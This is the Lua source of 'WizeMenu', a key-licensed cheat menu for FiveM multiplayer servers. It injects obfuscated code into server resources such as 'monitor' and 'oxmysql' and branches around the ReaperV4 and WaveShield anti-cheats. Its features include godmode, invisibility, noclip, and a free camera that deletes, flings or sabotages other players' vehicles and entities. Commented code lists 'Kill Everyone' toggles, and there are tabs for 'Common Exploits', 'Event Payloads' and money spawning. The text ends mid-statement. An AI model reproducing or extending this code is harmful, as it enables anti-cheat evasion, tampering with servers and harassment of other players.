     local keyListUrl = "https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json"
    local KeysBin = MachoWebRequest(keyListUrl)
    local CurrentKey = MachoAuthenticationKey()
    local STRICT_EXPIRES = true

local function getEpochNow()
    local cloudTime = GetCloudTimeAsInt()
    return cloudTime > 0 and cloudTime or 0
end

local function parseIsoToEpoch(isoUtcString)
    if type(isoUtcString) ~= "string" then return nil end
    local y, m, d, h, min, s = string.match(isoUtcString, "(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z")
    if not y then return nil end
    local daysSinceEpoch = (tonumber(y) - 1970) * 365 + math.floor((tonumber(y) - 1969) / 4) + (tonumber(m) - 1) * 30 + tonumber(d)
    return daysSinceEpoch * 86400 + tonumber(h) * 3600 + tonumber(min) * 60 + tonumber(s)
end

local function isKeyValid()
    if not KeysBin then return false, "No key list available" end
    local ok, keys = pcall(json.decode, KeysBin)
    if not ok or not keys or type(keys) ~= "table" then return false, "Key list invalid" end
    local now = getEpochNow()
    for _, keyData in ipairs(keys) do
        if type(keyData) == "table" and keyData.key == CurrentKey then
            if keyData.expires and type(keyData.expires) == "string" then
                local expiresEpoch = parseIsoToEpoch(keyData.expires)
                if not expiresEpoch then return false, "Bad expiry format" end
                if expiresEpoch > now then
                    return true, "Key valid (not expired)", expiresEpoch
                else
                    return false, "Key expired", expiresEpoch
                end
            else
                if STRICT_EXPIRES then return false, "Key missing expiry (strict mode)" else return true, "Key valid (no expiry field)" end
            end
        end
    end
    return false, "Key not found"
end

local valid, reason, expiresEpoch = isKeyValid()
if not valid then
    MachoMenuNotification("WizeMenu", "Your key ain't valid lmfao: " .. CurrentKey .. " (" .. reason .. ")", 10)
    return
end

Citizen.CreateThread(function()
    if expiresEpoch and expiresEpoch > 0 then
        local now = getEpochNow()
        local remaining = expiresEpoch - now
        if remaining > 0 then
            local days = math.floor(remaining / 86400)
            local hours = math.floor((remaining % 86400) / 3600)
            local msg = string.format("Your key is valid. Expires in %d days and %d hours.", days, hours)
            MachoMenuNotification("WizeMenu", msg, 5)
        else
            MachoMenuNotification("WizeMenu", "Key expired.", 10)
        end
    else
        MachoMenuNotification("WizeMenu", "Key valid (no expiry field).", 5)
    end
end)


        local MenuSize = vec2(750, 500)
        local MenuStartCoords = vec2(500, 500)

        local TabsBarWidth = 150
        local SectionsPadding = 10
        local MachoPanelGap = 15

        local SectionChildWidth = MenuSize.x - TabsBarWidth
        local SectionChildHeight = MenuSize.y - (2 * SectionsPadding)

        local ColumnWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
        local HalfHeight = (SectionChildHeight - (SectionsPadding * 3)) / 2

        local MenuWindow = MachoMenuTabbedWindow("WizeVIP", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
        MachoMenuSetKeybind(MenuWindow, 0x21)
        MachoMenuSetAccent(MenuWindow, 207, 16, 32)

        MachoMenuText(MenuWindow, "YT @JayThaaGamer")

        --[[ local function CreateRainbowInterface()
            CreateThread(function()
                local offset = 0.0
                while true do
                    offset = offset + 0.065
                    local r = math.floor(127 + 127 * math.sin(offset))
                    local g = math.floor(127 + 127 * math.sin(offset + 2))
                    local b = math.floor(127 + 127 * math.sin(offset + 4))
                    MachoMenuSetAccent(MenuWindow, r, g, b)
                    Wait(25)
                end
            end)
        end

        CreateRainbowInterface() ]]

        local PlayerTab = MachoMenuAddTab(MenuWindow, "Self")
        local ServerTab = MachoMenuAddTab(MenuWindow, "Server")
        local TeleportTab = MachoMenuAddTab(MenuWindow, "Teleport")
        local WeaponTab = MachoMenuAddTab(MenuWindow, "Weapon")
        local VehicleTab = MachoMenuAddTab(MenuWindow, "Vehicle")
        local EmoteTab = MachoMenuAddTab(MenuWindow, "Animations")
        local EventTab = MachoMenuAddTab(MenuWindow, "Triggers")
        local SettingTab = MachoMenuAddTab(MenuWindow, "Settings")
        local VIPTab = MachoMenuAddTab(MenuWindow, "VIP")

        -- Tab Content
        local function PlayerTabContent(tab)
            local leftX = TabsBarWidth + SectionsPadding
            local topY = SectionsPadding + MachoPanelGap
            local midY = topY + HalfHeight + SectionsPadding
            local rightX = leftX + ColumnWidth + SectionsPadding

            local totalRightHeight = (HalfHeight * 2) + SectionsPadding

            local SectionOne = MachoMenuGroup(tab, "Self", leftX, topY, leftX + ColumnWidth, topY + totalRightHeight)

            local SectionTwo = MachoMenuGroup(tab, "Model Changer", rightX, topY, rightX + ColumnWidth, topY + HalfHeight)
            local SectionThree = MachoMenuGroup(tab, "Functions", rightX, midY, rightX + ColumnWidth, midY + HalfHeight)

            return SectionOne, SectionTwo, SectionThree
        end

        local function ServerTabContent(tab)
            local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
            local SectionOneStartX = TabsBarWidth + SectionsPadding
            local SectionOneEndX = SectionOneStartX + EachSectionWidth
            local SectionOne = MachoMenuGroup(tab, "Server Players", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

            local SectionTwoStartX = SectionOneEndX + SectionsPadding
            local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
            local SectionTwo = MachoMenuGroup(tab, "Server Players 2", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

            return SectionOne, SectionTwo
        end

        local function TeleportTabContent(tab)
            local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
            local SectionOneStartX = TabsBarWidth + SectionsPadding
            local SectionOneEndX = SectionOneStartX + EachSectionWidth
            local SectionOne = MachoMenuGroup(tab, "Teleport", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

            local SectionTwoStartX = SectionOneEndX + SectionsPadding
            local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
            local SectionTwo = MachoMenuGroup(tab, "Other", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

            return SectionOne, SectionTwo
        end

        local function WeaponTabContent(tab)
            local leftX = TabsBarWidth + SectionsPadding
            local topY = SectionsPadding + MachoPanelGap
            local midY = topY + HalfHeight + SectionsPadding

            local SectionOne = MachoMenuGroup(tab, "Mods", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
            local SectionTwo = MachoMenuGroup(tab, "Weapon Spawner [All+Ammo]", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

            local rightX = leftX + ColumnWidth + SectionsPadding
            local SectionThree = MachoMenuGroup(tab, "Other", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

            return SectionOne, SectionTwo, SectionThree
        end

        local function VehicleTabContent(tab)
            local leftX = TabsBarWidth + SectionsPadding
            local topY = SectionsPadding + MachoPanelGap
            local midY = topY + HalfHeight + SectionsPadding

            local SectionOne = MachoMenuGroup(tab, "Mods", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
            local SectionTwo = MachoMenuGroup(tab, "Plate & Spawning", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

            local rightX = leftX + ColumnWidth + SectionsPadding
            local SectionThree = MachoMenuGroup(tab, "Other", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

            return SectionOne, SectionTwo, SectionThree
        end

        local function EmoteTabContent(tab)
            local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
            local SectionOneStartX = TabsBarWidth + SectionsPadding
            local SectionOneEndX = SectionOneStartX + EachSectionWidth
            local SectionOne = MachoMenuGroup(tab, "Animations", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

            local SectionTwoStartX = SectionOneEndX + SectionsPadding
            local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
            local SectionTwo = MachoMenuGroup(tab, "Force Emotes", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

            return SectionOne, SectionTwo
        end

        local function EventTabContent(tab)
            local leftX = TabsBarWidth + SectionsPadding
            local topY = SectionsPadding + MachoPanelGap
            local midY = topY + HalfHeight + SectionsPadding

            local SectionOne = MachoMenuGroup(tab, "Item Spawner", leftX, midY, leftX + ColumnWidth, topY + HalfHeight)
            local SectionTwo = MachoMenuGroup(tab, "Money Spawner", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
            --local SectionOne = MachoMenuGroup(tab, "Item Spawner", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

            local rightX = leftX + ColumnWidth + SectionsPadding
            local SectionThree = MachoMenuGroup(tab, "Common Exploits", rightX, topY, rightX + ColumnWidth, topY + HalfHeight)
            local SectionFour = MachoMenuGroup(tab, "Event Payloads", rightX, midY, rightX + ColumnWidth, midY + HalfHeight)

            return SectionOne, SectionTwo, SectionThree, SectionFour
        end

        local function VIPTabContent(tab)
            local leftX = TabsBarWidth + SectionsPadding
            local topY = SectionsPadding + MachoPanelGap
            local midY = topY + HalfHeight + SectionsPadding

            local SectionOne = MachoMenuGroup(tab, "Trigger Finder Spawner", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
            local SectionTwo = MachoMenuGroup(tab, "Common Exploits", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

            local rightX = leftX + ColumnWidth + SectionsPadding
            local SectionThree = MachoMenuGroup(tab, "Common Exploits V2", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

            return SectionOne, SectionTwo, SectionThree
        end

        local function SettingTabContent(tab)
            local leftX = TabsBarWidth + SectionsPadding
            local topY = SectionsPadding + MachoPanelGap
            local midY = topY + HalfHeight + SectionsPadding

            local SectionOne = MachoMenuGroup(tab, "Stop", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
            local SectionTwo = MachoMenuGroup(tab, "Menu Design", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

            local rightX = leftX + ColumnWidth + SectionsPadding
            local SectionThree = MachoMenuGroup(tab, "Server Settings", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

            return SectionOne, SectionTwo, SectionThree
        end

        -- Tab Sections
        local PlayerTabSections = { PlayerTabContent(PlayerTab) }
        local ServerTabSections = { ServerTabContent(ServerTab) }
        local TeleportTabSections = { TeleportTabContent(TeleportTab) }
        local WeaponTabSections = { WeaponTabContent(WeaponTab) }
        local VehicleTabSections = { VehicleTabContent(VehicleTab) }
        local EmoteTabSections = { EmoteTabContent(EmoteTab) }
        local EventTabSections = { EventTabContent(EventTab) }
        local VIPTabSections = { VIPTabContent(VIPTab) }
        local SettingTabSections = { SettingTabContent(SettingTab) }

        -- Functions
        local function CheckResource(resource)
            return GetResourceState(resource) == "started"
        end


    local function LoadBypasses()
        Wait(1500)

        MachoMenuNotification("[NOTIFICATION] WizeMenu", "Starting.")

        Wait(500)

        MachoMenuNotification("[NOTIFICATION] WizeMenu", "Almost there!.")
    end

    --LoadBypasses()

    --local targetResource
    --if GetResourceState("qbx_core") == "started" then
       -- targetResource = "qbx_core"
   -- elseif GetResourceState("es_extended") == "started" then
     --   targetResource = "es_extended"
    --elseif GetResourceState("qb-core") == "started" then
    --    targetResource = "qb-core"
    --else
    --    targetResource = "any"
    --end

        Citizen.CreateThread(function()
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Finished!")
            Wait(500)
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Wize On Top!!")
        end)


        --MachoLockLogger()

        -- Locals
        ---MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
            --[[ Unloaded = false
            local xJdRtVpNzQmKyLf = false -- Free Camera
            local aXfPlMnQwErTyUi = false -- Godmode
            local sRtYuIoPaSdFgHj = false -- Invisibility
            local mKjHgFdSaPlMnBv = false -- No Ragdoll
            local uYtReWqAzXcVbNm = false -- Infinite Stamina
            local peqCrVzHDwfkraYZ = false -- Shrink Ped
            local NpYgTbUcXsRoVm = false -- No Clip
            local xCvBnMqWeRtYuIo = false -- Super Jump
            local nxtBFlQWMMeRLs = false -- Levitation
            local fgawjFmaDjdALaO = false -- Super Strength
            local qWeRtYuIoPlMnBv = false -- Super Punch
            local zXpQwErTyUiPlMn = false -- Throw From Vehicle
            local kJfGhTrEeWqAsDz = false -- Force Third Person
            local zXcVbNmQwErTyUi = false -- Force Driveby
            local yHnvrVNkoOvGMWiS = false -- Anti-Headshot
            local nHgFdSaZxCvBnMq = false -- Anti-Freeze
            local fAwjeldmwjrWkSf = false -- Anti-TP
            local aDjsfmansdjwAEl = false -- Anti-Blackscreen
            local qWpEzXvBtNyLmKj = false -- Crosshair

            local egfjWADmvsjAWf = false -- Spoofed Weapon Spawning
            local LkJgFdSaQwErTy = false -- Infinite Ammo
            local QzWxEdCvTrBnYu = false -- Explosive Ammo
            local RfGtHyUjMiKoLp = false -- One Shot Kill 

            local zXcVbNmQwErTyUi = false -- Vehicle Godmode
            local RNgZCddPoxwFhmBX = false -- Force Vehicle Engine
            local PlAsQwErTyUiOp = false -- Vehicle Auto Repair
            local LzKxWcVbNmQwErTy = false -- Freeze Vehicle
            local NuRqVxEyKiOlZm = false -- Vehicle Hop
            local GxRpVuNzYiTq = false -- Rainbow Vehicle
            local MqTwErYuIoLp = false -- Drift Mode
            local NvGhJkLpOiUy = false -- Easy Handling
            local VkLpOiUyTrEq = false -- Instant Breaks
            local BlNkJmLzXcVb = false -- Unlimited Fuel

            local aSwDeFgHiJkLoPx = false -- Normal Kill Everyone
            local qWeRtYuIoPlMnAb = false -- Permanent Kill Everyone
            local tUOgshhvIaku = false -- RPG Kill Everyone
            local zXcVbNmQwErTyUi = false ]] -- 
        --]])

        -- Features
        MachoMenuCheckbox(PlayerTabSections[1], "Godmode", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
                aXfPlMnQwErTyUi = true

                local function OxWJ1rY9vB()
                    local fLdRtYpLoWqEzXv = CreateThread
                    fLdRtYpLoWqEzXv(function()
                        while aXfPlMnQwErTyUi and not Unloaded do
                            local dOlNxGzPbTcQ = PlayerPedId()
                            local rKsEyHqBmUiW = PlayerId()

                            if GetResourceState("ReaperV4") == "started" then
                                local kcWsWhJpCwLI = SetPlayerInvincible
                                local ByTqMvSnAzXd = SetEntityInvincible
                                kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                                ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                            elseif GetResourceState("WaveShield") == "started" then
                                local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                                cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                            else
                                local BiIqUJHexRrR = SetEntityCanBeDamaged
                                local UtgGRNyiPhOs = SetEntityProofs
                                local rVuKoDwLsXpC = SetEntityInvincible

                                BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                                UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                                rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                            end

                            Wait(0)
                        end
                    end)
                end

                OxWJ1rY9vB()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                aXfPlMnQwErTyUi = false

                local dOlNxGzPbTcQ = PlayerPedId()
                local rKsEyHqBmUiW = PlayerId()

                if GetResourceState("ReaperV4") == "started" then
                    local kcWsWhJpCwLI = SetPlayerInvincible
                    local ByTqMvSnAzXd = SetEntityInvincible

                    kcWsWhJpCwLI(rKsEyHqBmUiW, false)
                    ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

                elseif GetResourceState("WaveShield") == "started" then
                    local AilJsyZTXnNc = SetEntityCanBeDamaged
                    AilJsyZTXnNc(dOlNxGzPbTcQ, true)

                else
                    local tBVAZMubUXmO = SetEntityCanBeDamaged
                    local yuTiZtxOXVnE = SetEntityProofs
                    local rVuKoDwLsXpC = SetEntityInvincible

                    tBVAZMubUXmO(dOlNxGzPbTcQ, true)
                    yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
                    rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
                end
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Invisibility", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                sRtYuIoPaSdFgHj = true

                local function d2NcWoyTfb()
                    if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                    sRtYuIoPaSdFgHj = true

                    local zXwCeVrBtNuMyLk = CreateThread
                    zXwCeVrBtNuMyLk(function()
                        while sRtYuIoPaSdFgHj and not Unloaded do
                            local uYiTpLaNmZxCwEq = SetEntityVisible
                            local hGfDrEsWxQaZcVb = PlayerPedId()
                            uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                            Wait(0)
                        end

                        local uYiTpLaNmZxCwEq = SetEntityVisible
                        local hGfDrEsWxQaZcVb = PlayerPedId()
                        uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                    end)
                end

                d2NcWoyTfb()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                sRtYuIoPaSdFgHj = false

                local function tBKM4syGJL()
                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                end

                tBKM4syGJL()
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "No Ragdoll", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
                mKjHgFdSaPlMnBv = true

                local function jP7xUrK9Ao()
                    local zVpLyNrTmQxWsEd = CreateThread
                    zVpLyNrTmQxWsEd(function()
                        while mKjHgFdSaPlMnBv and not Unloaded do
                            local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                            oPaSdFgHiJkLzXc(PlayerPedId(), false)
                            Wait(0)
                        end
                    end)
                end

                jP7xUrK9Ao()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                mKjHgFdSaPlMnBv = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Infinite Stamina", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
                uYtReWqAzXcVbNm = true

                local function YLvd3pM0tB()
                    local tJrGyHnMuQwSaZx = CreateThread
                    tJrGyHnMuQwSaZx(function()
                        while uYtReWqAzXcVbNm and not Unloaded do
                            local aSdFgHjKlQwErTy = RestorePlayerStamina
                            local rTyUiEaOpAsDfGhJk = PlayerId()
                            aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                            Wait(0)
                        end
                    end)
                end

                YLvd3pM0tB()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                uYtReWqAzXcVbNm = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Tiny Ped", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
                peqCrVzHDwfkraYZ = true

                local function YfeemkaufrQjXTFY()
                    local OLZACovzmAvgWPmC = CreateThread
                    OLZACovzmAvgWPmC(function()
                        while peqCrVzHDwfkraYZ and not Unloaded do
                            local aukLdkvEinBsMWuA = SetPedConfigFlag
                            aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                            Wait(0)
                        end
                    end)
                end

                YfeemkaufrQjXTFY()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                peqCrVzHDwfkraYZ = false
                local aukLdkvEinBsMWuA = SetPedConfigFlag
                aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "No Clip", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
                NpYgTbUcXsRoVm = true

                local function KUQpH7owdz()
                    local RvBcNxMzKgUiLo = PlayerPedId
                    local EkLpOiUhYtGrFe = GetVehiclePedIsIn
                    local CtVbXnMzQaWsEd = GetEntityCoords
                    local DrTgYhUjIkOlPm = GetEntityHeading
                    local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
                    local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
                    local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
                    local TyUiOpAsDfGhJk = IsDisabledControlPressed
                    local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
                    local PlMnBvCxZaSdFg = SetEntityHeading
                    local HnJmKlPoIuYtRe = CreateThread

                    local YtReWqAzXsEdCv = false

                    HnJmKlPoIuYtRe(function()
                        while NpYgTbUcXsRoVm and not Unloaded do
                            Wait(0)

                            if JkLzXcVbNmAsDf(0, 303) then
                                YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                            end

                            if YtReWqAzXsEdCv then
                                local speed = 2.0

                                local p = RvBcNxMzKgUiLo()
                                local v = EkLpOiUhYtGrFe(p, false)
                                local inVeh = v ~= 0 and v ~= nil
                                local ent = inVeh and v or p

                                local pos = CtVbXnMzQaWsEd(ent, true)
                                local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                                local pitch = AoSdFgHjKlZxCv()

                                local dx = -math.sin(math.rad(head))
                                local dy = math.cos(math.rad(head))
                                local dz = math.sin(math.rad(pitch))
                                local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                                if len ~= 0 then
                                    dx, dy, dz = dx / len, dy / len, dz / len
                                end

                                if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                                if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                                if TyUiOpAsDfGhJk(0, 32) then
                                    pos = pos + vector3(dx, dy, dz) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 34) then
                                    pos = pos + vector3(-dy, dx, 0.0) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 269) then
                                    pos = pos - vector3(dx, dy, dz) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 9) then
                                    pos = pos + vector3(dy, -dx, 0.0) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 22) then
                                    pos = pos + vector3(0.0, 0.0, speed)
                                end
                                if TyUiOpAsDfGhJk(0, 36) then
                                    pos = pos - vector3(0.0, 0.0, speed)
                                end

                                WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                                PlMnBvCxZaSdFg(ent, head)
                            end
                        end
                        YtReWqAzXsEdCv = false
                    end)
                end

                KUQpH7owdz()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                NpYgTbUcXsRoVm = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Free Camera", function()
            MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
                
                g_FreecamFeatureEnabled = true
                
                local function initializeFreecam()
                    -- Script State
                    local isFreecamActive = false
                    local freecamHandle = nil
                    local targetCoords, targetEntity = nil, nil
                    local currentFeatureIndex = 1

                    -- NEW FEATURE: Ped Spawning State
                    local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
                    local currentPedIndex = 1

                    local stopFreecam, startFreecam

                    -- Feature Definitions (Now with Ped Spawner)
                    local Features = { 
                        "Look-Around", 
                        "Spawn Ped",         -- ADDED
                        "Teleport", 
                        "Delete Entity", 
                        "Fling Entity", 
                        "Flip Vehicle", 
                        "Launch Vehicle",
                        "Teleport Vehicle",
                        "Mess With Vehicle"
                    }

                    -- Helper Function for Drawing Text
                    local function drawText(content, x, y, options)
                        SetTextFont(options.font or 4)
                        SetTextScale(0.0, options.scale or 0.3)
                        SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                        SetTextOutline()
                        if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                        SetTextCentre(true)
                        BeginTextCommandDisplayText("STRING")
                        AddTextComponentSubstringPlayerName(content)
                        EndTextCommandDisplayText(x, y)
                    end

                    -- Main Draw Thread (UI Only)
                    local function drawThread()
                        while isFreecamActive do
                            Wait(0)
                            -- Draw Crosshair
                            drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                            
                            -- ##### UI FIX: SCROLLING MENU LOGIC #####
                            local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                            local numFeatures = #Features
                            local startIdx, endIdx = 1, numFeatures

                            if numFeatures > ui.maxVisible then
                                startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                                endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                                if endIdx == numFeatures then
                                    startIdx = numFeatures - ui.maxVisible + 1
                                end
                            end

                            -- Draw a counter above the list
                            drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                            local displayCount = 0
                            for i = startIdx, endIdx do
                                local featureName = Features[i]
                                local isSelected = (i == currentFeatureIndex)
                                local lineY = ui.y + (displayCount * ui.lineHeight)
                                if isSelected then
                                    drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                                else
                                    drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                                end
                                displayCount = displayCount + 1
                            end
                        end
                    end

                    -- Main Input and Logic Thread
                    local function logicThread()
                        while isFreecamActive do
                            Wait(0)
                            if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                            
                            if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                                local currentFeature = Features[currentFeatureIndex]
                                if currentFeature == "Teleport" and targetCoords then
                                    local ped = PlayerPedId()
                                    local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                                    SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                                -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                                elseif currentFeature == "Spawn Ped" and targetCoords then
                                    local model = pedsToSpawn[currentPedIndex]
                                    CreateThread(function()
                                        local modelHash = GetHashKey(model)
                                        RequestModel(modelHash)
                                        local timeout = 2000 -- 2 second timeout for model loading
                                        while not HasModelLoaded(modelHash) and timeout > 0 do
                                            Wait(100)
                                            timeout = timeout - 100
                                        end
                                        if HasModelLoaded(modelHash) then
                                            local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                            local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                            local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                            SetModelAsNoLongerNeeded(modelHash)
                                            TaskStandStill(newPed, -1) -- Make them stand still
                                            currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                        end
                                    end)
                                elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                                    SetEntityAsMissionEntity(targetEntity, true, true)
                                    DeleteEntity(targetEntity)
                                elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                                    ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    SetVehicleOnGroundProperly(targetEntity)
                                elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    local currentCoords = GetEntityCoords(targetEntity)
                                    local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                                    SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                                elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    local actions = {
                                        function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                        function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
